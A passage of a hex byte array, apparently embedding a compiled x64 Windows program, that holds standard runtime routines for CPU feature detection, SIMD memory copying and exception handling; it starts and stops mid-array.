0x7, 0x44, 0x8b, 0x5, 0xcc, 0x7f, 0x1, 0x0, 0xb8, 0x7, 0x0, 0x0, 0x0, 0x44, 0x8d, 0x48, 0xfb, 0x3b, 0xf0, 0x7c, 0x26, 0x33, 0xc9, 0xf, 0xa2, 0x89, 0x4, 0x24, 0x44, 0x8b, 0xdb, 0x89, 0x5c, 0x24, 0x4, 0x89, 0x4c, 0x24, 0x8, 0x89, 0x54, 0x24, 0xc, 0xf, 0xba, 0xe3, 0x9, 0x73, 0xa, 0x45, 0xb, 0xc1, 0x44, 0x89, 0x5, 0x99, 0x7f, 0x1, 0x0, 0xc7, 0x5, 0xbf, 0x74, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x44, 0x89, 0xd, 0xbc, 0x74, 0x1, 0x0, 0xf, 0xba, 0xe7, 0x14, 0xf, 0x83, 0x91, 0x0, 0x0, 0x0, 0x44, 0x89, 0xd, 0xa7, 0x74, 0x1, 0x0, 0xbb, 0x6, 0x0, 0x0, 0x0, 0x89, 0x1d, 0xa0, 0x74, 0x1, 0x0, 0xf, 0xba, 0xe7, 0x1b, 0x73, 0x79, 0xf, 0xba, 0xe7, 0x1c, 0x73, 0x73, 0x33, 0xc9, 0xf, 0x1, 0xd0, 0x48, 0xc1, 0xe2, 0x20, 0x48, 0xb, 0xd0, 0x48, 0x89, 0x54, 0x24, 0x20, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x22, 0xc3, 0x3a, 0xc3, 0x75, 0x57, 0x8b, 0x5, 0x72, 0x74, 0x1, 0x0, 0x83, 0xc8, 0x8, 0xc7, 0x5, 0x61, 0x74, 0x1, 0x0, 0x3, 0x0, 0x0, 0x0, 0x89, 0x5, 0x5f, 0x74, 0x1, 0x0, 0x41, 0xf6, 0xc3, 0x20, 0x74, 0x38, 0x83, 0xc8, 0x20, 0xc7, 0x5, 0x48, 0x74, 0x1, 0x0, 0x5, 0x0, 0x0, 0x0, 0x89, 0x5, 0x46, 0x74, 0x1, 0x0, 0xb8, 0x0, 0x0, 0x3, 0xd0, 0x44, 0x23, 0xd8, 0x44, 0x3b, 0xd8, 0x75, 0x18, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x24, 0xe0, 0x3c, 0xe0, 0x75, 0xd, 0x83, 0xd, 0x27, 0x74, 0x1, 0x0, 0x40, 0x89, 0x1d, 0x1d, 0x74, 0x1, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x28, 0x33, 0xc0, 0x48, 0x8b, 0x74, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x10, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xc3, 0xcc, 0xcc, 0x33, 0xc0, 0x39, 0x5, 0xe0, 0x8f, 0x1, 0x0, 0xf, 0x95, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x57, 0x56, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xf2, 0x49, 0x8b, 0xc8, 0xf3, 0xa4, 0x5e, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xc1, 0x4c, 0x8d, 0x15, 0x66, 0xe2, 0xff, 0xff, 0x49, 0x83, 0xf8, 0xf, 0xf, 0x87, 0xc, 0x1, 0x0, 0x0, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x47, 0x8b, 0x8c, 0x82, 0x0, 0xc0, 0x1, 0x0, 0x4d, 0x3, 0xca, 0x41, 0xff, 0xe1, 0xc3, 0x90, 0x4c, 0x8b, 0x2, 0x8b, 0x4a, 0x8, 0x44, 0xf, 0xb7, 0x4a, 0xc, 0x44, 0xf, 0xb6, 0x52, 0xe, 0x4c, 0x89, 0x0, 0x89, 0x48, 0x8, 0x66, 0x44, 0x89, 0x48, 0xc, 0x44, 0x88, 0x50, 0xe, 0xc3, 0x4c, 0x8b, 0x2, 0xf, 0xb7, 0x4a, 0x8, 0x44, 0xf, 0xb6, 0x4a, 0xa, 0x4c, 0x89, 0x0, 0x66, 0x89, 0x48, 0x8, 0x44, 0x88, 0x48, 0xa, 0xc3, 0xf, 0xb7, 0xa, 0x66, 0x89, 0x8, 0xc3, 0x90, 0x8b, 0xa, 0x44, 0xf, 0xb7, 0x42, 0x4, 0x44, 0xf, 0xb6, 0x4a, 0x6, 0x89, 0x8, 0x66, 0x44, 0x89, 0x40, 0x4, 0x44, 0x88, 0x48, 0x6, 0xc3, 0x4c, 0x8b, 0x2, 0x8b, 0x4a, 0x8, 0x44, 0xf, 0xb7, 0x4a, 0xc, 0x4c, 0x89, 0x0, 0x89, 0x48, 0x8, 0x66, 0x44, 0x89, 0x48, 0xc, 0xc3, 0xf, 0xb7, 0xa, 0x44, 0xf, 0xb6, 0x42, 0x2, 0x66, 0x89, 0x8, 0x44, 0x88, 0x40, 0x2, 0xc3, 0x90, 0x4c, 0x8b, 0x2, 0x8b, 0x4a, 0x8, 0x44, 0xf, 0xb6, 0x4a, 0xc, 0x4c, 0x89, 0x0, 0x89, 0x48, 0x8, 0x44, 0x88, 0x48, 0xc, 0xc3, 0x4c, 0x8b, 0x2, 0xf, 0xb7, 0x4a, 0x8, 0x4c, 0x89, 0x0, 0x66, 0x89, 0x48, 0x8, 0xc3, 0x4c, 0x8b, 0x2, 0xf, 0xb6, 0x4a, 0x8, 0x4c, 0x89, 0x0, 0x88, 0x48, 0x8, 0xc3, 0x4c, 0x8b, 0x2, 0x8b, 0x4a, 0x8, 0x4c, 0x89, 0x0, 0x89, 0x48, 0x8, 0xc3, 0x8b, 0xa, 0x44, 0xf, 0xb7, 0x42, 0x4, 0x89, 0x8, 0x66, 0x44, 0x89, 0x40, 0x4, 0xc3, 0x8b, 0xa, 0x44, 0xf, 0xb6, 0x42, 0x4, 0x89, 0x8, 0x44, 0x88, 0x40, 0x4, 0xc3, 0x48, 0x8b, 0xa, 0x48, 0x89, 0x8, 0xc3, 0xf, 0xb6, 0xa, 0x88, 0x8, 0xc3, 0x8b, 0xa, 0x89, 0x8, 0xc3, 0x90, 0x49, 0x83, 0xf8, 0x20, 0x77, 0x17, 0xf3, 0xf, 0x6f, 0xa, 0xf3, 0x42, 0xf, 0x6f, 0x54, 0x2, 0xf0, 0xf3, 0xf, 0x7f, 0x9, 0xf3, 0x42, 0xf, 0x7f, 0x54, 0x1, 0xf0, 0xc3, 0x48, 0x3b, 0xd1, 0x73, 0xe, 0x4e, 0x8d, 0xc, 0x2, 0x49, 0x3b, 0xc9, 0xf, 0x82, 0x41, 0x4, 0x0, 0x0, 0x90, 0x83, 0x3d, 0x61, 0x72, 0x1, 0x0, 0x3, 0xf, 0x82, 0xe3, 0x2, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x20, 0x0, 0x0, 0x76, 0x16, 0x49, 0x81, 0xf8, 0x0, 0x0, 0x18, 0x0, 0x77, 0xd, 0xf6, 0x5, 0x12, 0x7d, 0x1, 0x0, 0x2, 0xf, 0x85, 0x64, 0xfe, 0xff, 0xff, 0xc5, 0xfe, 0x6f, 0x2, 0xc4, 0xa1, 0x7e, 0x6f, 0x6c, 0x2, 0xe0, 0x49, 0x81, 0xf8, 0x0, 0x1, 0x0, 0x0, 0xf, 0x86, 0xc4, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc9, 0x49, 0x83, 0xe1, 0x1f, 0x49, 0x83, 0xe9, 0x20, 0x49, 0x2b, 0xc9, 0x49, 0x2b, 0xd1, 0x4d, 0x3, 0xc1, 0x49, 0x81, 0xf8, 0x0, 0x1, 0x0, 0x0, 0xf, 0x86, 0xa3, 0x0, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x0, 0x18, 0x0, 0xf, 0x87, 0x3e, 0x1, 0x0, 0x0, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0xa, 0xc5, 0xfe, 0x6f, 0x52, 0x20, 0xc5, 0xfe, 0x6f, 0x5a, 0x40, 0xc5, 0xfe, 0x6f, 0x62, 0x60, 0xc5, 0xfd, 0x7f, 0x9, 0xc5, 0xfd, 0x7f, 0x51, 0x20, 0xc5, 0xfd, 0x7f, 0x59, 0x40, 0xc5, 0xfd, 0x7f, 0x61, 0x60, 0xc5, 0xfe, 0x6f, 0x8a, 0x80, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0x92, 0xa0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0x9a, 0xc0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0xa2, 0xe0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0x7f, 0x89, 0x80, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0x7f, 0x91, 0xa0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0x7f, 0x99, 0xc0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0x7f, 0xa1, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x81, 0xc1, 0x0, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc2, 0x0, 0x1, 0x0, 0x0, 0x49, 0x81, 0xe8, 0x0, 0x1, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x1, 0x0, 0x0, 0xf, 0x83, 0x78, 0xff, 0xff, 0xff, 0x4d, 0x8d, 0x48, 0x1f, 0x49, 0x83, 0xe1, 0xe0, 0x4d, 0x8b, 0xd9, 0x49, 0xc1, 0xeb, 0x5, 0x47, 0x8b, 0x9c, 0x9a, 0x40, 0xc0, 0x1, 0x0, 0x4d, 0x3, 0xda, 0x41, 0xff, 0xe3, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x0, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x7f, 0x8c, 0x9, 0x0, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x20, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x7f, 0x8c, 0x9, 0x20, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x40, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x7f, 0x8c, 0x9, 0x40, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x60, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x7f, 0x8c, 0x9, 0x60, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0x80, 0xc4, 0xa1, 0x7e, 0x7f, 0x4c, 0x9, 0x80, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0xa0, 0xc4, 0xa1, 0x7e, 0x7f, 0x4c, 0x9, 0xa0, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0xc0, 0xc4, 0xa1, 0x7e, 0x7f, 0x4c, 0x9, 0xc0, 0xc4, 0xa1, 0x7e, 0x7f, 0x6c, 0x1, 0xe0, 0xc5, 0xfe, 0x7f, 0x0, 0xc5, 0xf8, 0x77, 0xc3, 0x66, 0x90, 0xc5, 0xfe, 0x6f, 0xa, 0xc5, 0xfe, 0x6f, 0x52, 0x20, 0xc5, 0xfe, 0x6f, 0x5a, 0x40, 0xc5, 0xfe, 0x6f, 0x62, 0x60, 0xc5, 0xfd, 0xe7, 0x9, 0xc5, 0xfd, 0xe7, 0x51, 0x20, 0xc5, 0xfd, 0xe7, 0x59, 0x40, 0xc5, 0xfd, 0xe7, 0x61, 0x60, 0xc5, 0xfe, 0x6f, 0x8a, 0x80, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0x92, 0xa0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0x9a, 0xc0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0xa2, 0xe0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0xe7, 0x89, 0x80, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0xe7, 0x91, 0xa0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0xe7, 0x99, 0xc0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0xe7, 0xa1, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x81, 0xc1, 0x0, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc2, 0x0, 0x1, 0x0, 0x0, 0x49, 0x81, 0xe8, 0x0, 0x1, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x1, 0x0, 0x0, 0xf, 0x83, 0x78, 0xff, 0xff, 0xff, 0x4d, 0x8d, 0x48, 0x1f, 0x49, 0x83, 0xe1, 0xe0, 0x4d, 0x8b, 0xd9, 0x49, 0xc1, 0xeb, 0x5, 0x47, 0x8b, 0x9c, 0x9a, 0x64, 0xc0, 0x1, 0x0, 0x4d, 0x3, 0xda, 0x41, 0xff, 0xe3, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x0, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7d, 0xe7, 0x8c, 0x9, 0x0, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x20, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7d, 0xe7, 0x8c, 0x9, 0x20, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x40, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7d, 0xe7, 0x8c, 0x9, 0x40, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x60, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7d, 0xe7, 0x8c, 0x9, 0x60, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0x80, 0xc4, 0xa1, 0x7d, 0xe7, 0x4c, 0x9, 0x80, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0xa0, 0xc4, 0xa1, 0x7d, 0xe7, 0x4c, 0x9, 0xa0, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0xc0, 0xc4, 0xa1, 0x7d, 0xe7, 0x4c, 0x9, 0xc0, 0xc4, 0xa1, 0x7e, 0x7f, 0x6c, 0x1, 0xe0, 0xc5, 0xfe, 0x7f, 0x0, 0xf, 0xae, 0xf8, 0xc5, 0xf8, 0x77, 0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x8, 0x0, 0x0, 0x76, 0xd, 0xf6, 0x5, 0x38, 0x7a, 0x1, 0x0, 0x2, 0xf, 0x85, 0x8a, 0xfb, 0xff, 0xff, 0xf3, 0xf, 0x6f, 0x2, 0xf3, 0x42, 0xf, 0x6f, 0x6c, 0x2, 0xf0, 0x49, 0x81, 0xf8, 0x80, 0x0, 0x0, 0x0, 0xf, 0x86, 0x8e, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc9, 0x49, 0x83, 0xe1, 0xf, 0x49, 0x83, 0xe9, 0x10, 0x49, 0x2b, 0xc9, 0x49, 0x2b, 0xd1, 0x4d, 0x3, 0xc1, 0x49, 0x81, 0xf8, 0x80, 0x0, 0x0, 0x0, 0x76, 0x71, 0xf, 0x1f, 0x44, 0x0, 0x0, 0xf3, 0xf, 0x6f, 0xa, 0xf3, 0xf, 0x6f, 0x52, 0x10, 0xf3, 0xf, 0x6f, 0x5a, 0x20, 0xf3, 0xf, 0x6f, 0x62, 0x30, 0x66, 0xf, 0x7f, 0x9, 0x66, 0xf, 0x7f, 0x51, 0x10, 0x66, 0xf, 0x7f, 0x59, 0x20, 0x66, 0xf, 0x7f, 0x61, 0x30, 0xf3, 0xf, 0x6f, 0x4a, 0x40, 0xf3, 0xf, 0x6f, 0x52, 0x50, 0xf3, 0xf, 0x6f, 0x5a, 0x60, 0xf3, 0xf, 0x6f, 0x62, 0x70, 0x66, 0xf, 0x7f, 0x49, 0x40, 0x66, 0xf, 0x7f, 0x51, 0x50, 0x66, 0xf, 0x7f, 0x59, 0x60, 0x66, 0xf, 0x7f, 0x61, 0x70, 0x48, 0x81, 0xc1, 0x80, 0x0, 0x0, 0x0, 0x48, 0x81, 0xc2, 0x80, 0x0, 0x0, 0x0, 0x49, 0x81, 0xe8, 0x80, 0x0, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x80, 0x0, 0x0, 0x0, 0x73, 0x94, 0x4d, 0x8d, 0x48, 0xf, 0x49, 0x83, 0xe1, 0xf0, 0x4d, 0x8b, 0xd9, 0x49, 0xc1, 0xeb, 0x4, 0x47, 0x8b, 0x9c, 0x9a, 0x88, 0xc0, 0x1, 0x0, 0x4d, 0x3, 0xda, 0x41, 0xff, 0xe3, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0x80, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0x80, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0x90, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0x90, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xa0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xa0, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xb0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xb0, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xc0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xc0, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xd0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xd0, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xe0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xe0, 0xf3, 0x42, 0xf, 0x7f, 0x6c, 0x1, 0xf0, 0xf3, 0xf, 0x7f, 0x0, 0xc3, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xd9, 0x4c, 0x8b, 0xd2, 0x48, 0x2b, 0xd1, 0x49, 0x3, 0xc8, 0xf, 0x10, 0x44, 0x11, 0xf0, 0x48, 0x83, 0xe9, 0x10, 0x49, 0x83, 0xe8, 0x10, 0xf6, 0xc1, 0xf, 0x74, 0x17, 0x48, 0x8b, 0xc1, 0x48, 0x83, 0xe1, 0xf0, 0xf, 0x10, 0xc8, 0xf, 0x10, 0x4, 0x11, 0xf, 0x11, 0x8, 0x4c, 0x8b, 0xc1, 0x4d, 0x2b, 0xc3, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x7, 0x74, 0x6f, 0xf, 0x29, 0x1, 0xeb, 0x14, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0x29, 0x41, 0x10, 0xf, 0x29, 0x9, 0xf, 0x10, 0x44, 0x11, 0xf0, 0xf, 0x10, 0x4c, 0x11, 0xe0, 0x48, 0x81, 0xe9, 0x80, 0x0, 0x0, 0x0, 0xf, 0x29, 0x41, 0x70, 0xf, 0x29, 0x49, 0x60, 0xf, 0x10, 0x44, 0x11, 0x50, 0xf, 0x10, 0x4c, 0x11, 0x40, 0x49, 0xff, 0xc9, 0xf, 0x29, 0x41, 0x50, 0xf, 0x29, 0x49, 0x40, 0xf, 0x10, 0x44, 0x11, 0x30, 0xf, 0x10, 0x4c, 0x11, 0x20, 0xf, 0x29, 0x41, 0x30, 0xf, 0x29, 0x49, 0x20, 0xf, 0x10, 0x44, 0x11, 0x10, 0xf, 0x10, 0xc, 0x11, 0x75, 0xae, 0xf, 0x29, 0x41, 0x10, 0x49, 0x83, 0xe0, 0x7f, 0xf, 0x28, 0xc1, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x4, 0x74, 0x1a, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0x11, 0x1, 0x48, 0x83, 0xe9, 0x10, 0xf, 0x10, 0x4, 0x11, 0x49, 0xff, 0xc9, 0x75, 0xf0, 0x49, 0x83, 0xe0, 0xf, 0x74, 0x8, 0x41, 0xf, 0x10, 0xa, 0x41, 0xf, 0x11, 0xb, 0xf, 0x11, 0x1, 0x49, 0x8b, 0xc3, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xe9, 0x4d, 0x8b, 0xf9, 0x49, 0x8b, 0xc8, 0x49, 0x8b, 0xf8, 0x4c, 0x8b, 0xea, 0xe8, 0xec, 0x5, 0x0, 0x0, 0x4d, 0x8b, 0x67, 0x8, 0x4d, 0x8b, 0x37, 0x49, 0x8b, 0x5f, 0x38, 0x4d, 0x2b, 0xf4, 0xf6, 0x45, 0x4, 0x66, 0x41, 0x8b, 0x77, 0x48, 0xf, 0x85, 0xdc, 0x0, 0x0, 0x0, 0x48, 0x89, 0x6c, 0x24, 0x30, 0x48, 0x89, 0x7c, 0x24, 0x38, 0x3b, 0x33, 0xf, 0x83, 0x8a, 0x1, 0x0, 0x0, 0x8b, 0xfe, 0x48, 0x3, 0xff, 0x8b, 0x44, 0xfb, 0x4, 0x4c, 0x3b, 0xf0, 0xf, 0x82, 0xaa, 0x0, 0x0, 0x0, 0x8b, 0x44, 0xfb, 0x8, 0x4c, 0x3b, 0xf0, 0xf, 0x83, 0x9d, 0x0, 0x0, 0x0, 0x83, 0x7c, 0xfb, 0x10, 0x0, 0xf, 0x84, 0x92, 0x0, 0x0, 0x0, 0x83, 0x7c, 0xfb, 0xc, 0x1, 0x74, 0x17, 0x8b, 0x44, 0xfb, 0xc, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0x49, 0x3, 0xc4, 0x49, 0x8b, 0xd5, 0xff, 0xd0, 0x85, 0xc0, 0x78, 0x7d, 0x7e, 0x74, 0x81, 0x7d, 0x0, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x28, 0x48, 0x83, 0x3d, 0xb1, 0xce, 0x0, 0x0, 0x0, 0x74, 0x1e, 0x48, 0x8d, 0xd, 0xa8, 0xce, 0x0, 0x0, 0xe8, 0xa3, 0xb9, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xe, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xcd, 0xff, 0x15, 0x91, 0xce, 0x0, 0x0, 0x8b, 0x4c, 0xfb, 0x10, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x49, 0x3, 0xcc, 0x49, 0x8b, 0xd5, 0xe8, 0xfc, 0x4, 0x0, 0x0, 0x49, 0x8b, 0x47, 0x40, 0x4c, 0x8b, 0xc5, 0x8b, 0x54, 0xfb, 0x10, 0x49, 0x8b, 0xcd, 0x44, 0x8b, 0x4d, 0x0, 0x49, 0x3, 0xd4, 0x48, 0x89, 0x44, 0x24, 0x28, 0x49, 0x8b, 0x47, 0x28, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x15, 0xc3, 0xcb, 0x0, 0x0, 0xe8, 0xfe, 0x4, 0x0, 0x0, 0xff, 0xc6, 0xe9, 0x35, 0xff, 0xff, 0xff, 0x33, 0xc0, 0xe9, 0xc5, 0x0, 0x0, 0x0, 0x49, 0x8b, 0x7f, 0x20, 0x44, 0x8b, 0xb, 0x49, 0x2b, 0xfc, 0x41, 0x3b, 0xf1, 0xf, 0x83, 0xad, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xc1, 0x8b, 0xd6, 0x41, 0x8b, 0xc8, 0x48, 0x3, 0xd2, 0x8b, 0x44, 0xd3, 0x4, 0x4c, 0x3b, 0xf0, 0xf, 0x82, 0x88, 0x0, 0x0, 0x0, 0x8b, 0x44, 0xd3, 0x8, 0x4c, 0x3b, 0xf0, 0x73, 0x7f, 0x44, 0x8b, 0x5d, 0x4, 0x41, 0x83, 0xe3, 0x20, 0x74, 0x44, 0x45, 0x33, 0xd2, 0x45, 0x85, 0xc0, 0x74, 0x34, 0x41, 0x8b, 0xca, 0x48, 0x3, 0xc9, 0x8b, 0x44, 0xcb, 0x4, 0x48, 0x3b, 0xf8, 0x72, 0x1d, 0x8b, 0x44, 0xcb, 0x8, 0x48, 0x3b, 0xf8, 0x73, 0x14, 0x8b, 0x44, 0xd3, 0x10, 0x39, 0x44, 0xcb, 0x10, 0x75, 0xa, 0x8b, 0x44, 0xd3, 0xc, 0x39, 0x44, 0xcb, 0xc, 0x74, 0x8, 0x41, 0xff, 0xc2, 0x45, 0x3b, 0xd0, 0x72, 0xcc, 0x41, 0x8b, 0xc9, 0x45, 0x3b, 0xd1, 0x75, 0x3e, 0x8b, 0x44, 0xd3, 0x10, 0x85, 0xc0, 0x74, 0xc, 0x48, 0x3b, 0xf8, 0x75, 0x24, 0x45, 0x85, 0xdb, 0x75, 0x2c, 0xeb, 0x1d, 0x8d, 0x46, 0x1, 0xb1, 0x1, 0x41, 0x89, 0x47, 0x48, 0x44, 0x8b, 0x44, 0xd3, 0xc, 0x49, 0x8b, 0xd5, 0x4d, 0x3, 0xc4, 0x41, 0xff, 0xd0, 0x44, 0x8b, 0xb, 0x41, 0x8b, 0xc9, 0xff, 0xc6, 0x44, 0x8b, 0xc1, 0x3b, 0xf1, 0xf, 0x82, 0x56, 0xff, 0xff, 0xff, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5c, 0x24, 0x40, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x6b, 0x38, 0x49, 0x8b, 0x73, 0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xcc, 0x48, 0x3b, 0xca, 0x74, 0x19, 0x48, 0x83, 0xc2, 0x9, 0x48, 0x8d, 0x41, 0x9, 0x48, 0x2b, 0xd0, 0x8a, 0x8, 0x3a, 0xc, 0x10, 0x75, 0xa, 0x48, 0xff, 0xc0, 0x84, 0xc9, 0x75, 0xf2, 0x33, 0xc0, 0xc3, 0x1b, 0xc0, 0x83, 0xc8, 0x1, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xff, 0x15, 0xa0, 0xca, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x13, 0x48, 0x8b, 0x18, 0x48, 0x8b, 0xc8, 0xe8, 0xd0, 0x35, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x85, 0xdb, 0x75, 0xed, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0xa3, 0x5, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x4, 0x32, 0xc0, 0xeb, 0x12, 0xe8, 0x2a, 0x5, 0x0, 0x0, 0x84, 0xc0, 0x75, 0x7, 0xe8, 0xc1, 0x5, 0x0, 0x0, 0xeb, 0xec, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x4f, 0x4, 0x0, 0x0, 0x48, 0x85, 0xc0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x33, 0xc9, 0xe8, 0xcd, 0x3, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x84, 0xc9, 0x75, 0xa, 0xe8, 0x2b, 0x5, 0x0, 0x0, 0xe8, 0x7e, 0x5, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x13, 0x5, 0x0, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x85, 0xc9, 0x74, 0x67, 0x88, 0x54, 0x24, 0x10, 0x48, 0x83, 0xec, 0x48, 0x81, 0x39, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x53, 0x83, 0x79, 0x18, 0x4, 0x75, 0x4d, 0x8b, 0x41, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0x77, 0x40, 0x48, 0x8b, 0x41, 0x30, 0x48, 0x85, 0xc0, 0x74, 0x37, 0x48, 0x63, 0x50, 0x4, 0x85, 0xd2, 0x74, 0x11, 0x48, 0x3, 0x51, 0x38, 0x48, 0x8b, 0x49, 0x28, 0xe8, 